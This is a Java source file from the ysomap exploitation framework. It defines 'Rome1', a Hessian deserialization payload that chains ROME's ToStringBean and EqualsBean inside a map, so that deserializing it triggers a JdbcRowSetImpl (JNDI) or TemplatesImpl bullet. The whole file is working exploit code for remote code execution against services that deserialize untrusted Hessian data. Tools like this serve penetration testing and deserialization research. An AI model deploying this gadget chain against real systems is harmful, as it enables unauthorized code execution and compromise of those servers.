package ysomap.payloads.hessian;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.JdbcRowSetImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.xml.transform.Templates;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Authors({ Authors.MBECHLER, Authors.whocansee})
@Targets({Targets.HESSIAN, Targets.JDK})
@Require(bullets = {"JdbcRowSetImplBullet", "TemplatesImplBullet"},param = false)
@Dependencies({"com.rometools:rome:1.11.1"})
public class Rome1 extends HessianPayload{

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JdbcRowSetImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object stringBean = null;
        if(obj instanceof Templates){
            stringBean = makeStringBean(Templates.class, obj);
        }else{
            Class<?> type = obj.getClass();
            stringBean = makeStringBean(type, obj);
        }

        Object equalsBean = makeEqualsBean(makeStringBeanClass(), stringBean);

//        ObjectBean delegate = new ObjectBean(type, obj);
//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
//        ReflectionHelper.setFieldValue(bean, "_beanClass", null);
        ReflectionHelper.setFieldValue(equalsBean, "_beanClass", null);

        return PayloadHelper.makeMap(equalsBean, "");
//        return PayloadHelper.makeMap(root, root);
        // using XString trigger to ToStringBean also work
    }

    public Class<?> makeStringBeanClass() throws ClassNotFoundException {
        Class cls = null;
        try{
            // for rome 1.0
            cls = Class.forName("com.sun.syndication.feed.impl.ToStringBean");
        }catch (Exception e){
            // for rome 1.11.1
            cls = Class.forName("com.rometools.rome.feed.impl.ToStringBean");
        }
        return cls;
    }

    public Object makeStringBean(Class<?> type, Object obj) throws Exception {
        Object stringBean = null;
        try{
            // for rome 1.0
            stringBean = ReflectionHelper.newInstance("com.sun.syndication.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }catch (Exception e){
            // for rome 1.11.1
            stringBean = ReflectionHelper.newInstance("com.rometools.rome.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }
        return stringBean;
    }

    public Object makeEqualsBean(Class<?> type, Object obj) throws Exception {
        Object equalsBean = null;
        try{
            // for rome 1.0
            equalsBean = ReflectionHelper.newInstance("com.sun.syndication.feed.impl.EqualsBean", new Class[]{Class.class, Object.class}, type, obj);
        }catch (Exception e){
            // for rome 1.11.1
            equalsBean = ReflectionHelper.newInstance("com.rometools.rome.feed.impl.EqualsBean", new Class[]{Class.class, Object.class}, type, obj);
        }
        return equalsBean;
    }
}
